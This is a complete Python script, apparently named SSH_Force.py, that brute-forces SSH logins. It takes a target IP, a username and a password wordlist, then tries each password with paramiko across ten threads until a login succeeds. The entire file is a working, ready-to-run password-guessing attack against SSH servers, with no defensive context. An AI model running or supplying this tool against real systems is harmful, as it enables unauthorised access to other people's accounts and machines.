import paramiko
import sys
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed

if len(sys.argv) < 4:
    print("Usage: python SSH_Force.py [target] [username] [wordlist]")
    sys.exit()

# ----SSH_force.py [target] [username] [wordlist]
Target_ip = sys.argv[1]
username = sys.argv[2]
wordlist_path = sys.argv[3]


def ssh_login(Target_ip, username, password):
    # Establish the client
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(Target_ip, port=22,
                       username=username, password=password, timeout=3)
        print(f"[+] password find : {password}.")
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Password {password} is not correct.")
    except socket.timeout:
        print(f"[x] Connection timeout, target may not accessable.")
    except socket.error as e:
        print(f"[x] Network error message: {e}")
    finally:
        client.close()  # Close the connect if success or fail
    return False


with open(wordlist_path, 'r') as f:
    wordlist = [line.strip() for line in f]  # list
    print(
        f"[*] Start to excute SSH brute force with {username} on {Target_ip}......")

with ThreadPoolExecutor(max_workers=10) as executor:
    check_pwd = {executor.submit(
        ssh_login, Target_ip, username, pwd): pwd for pwd in wordlist}

    for check in as_completed(check_pwd):
        if check.result():
            print("[*] Success to find the password, stop the execution.")
            executor.shutdown(wait=False, cancel_futures=True)
            break
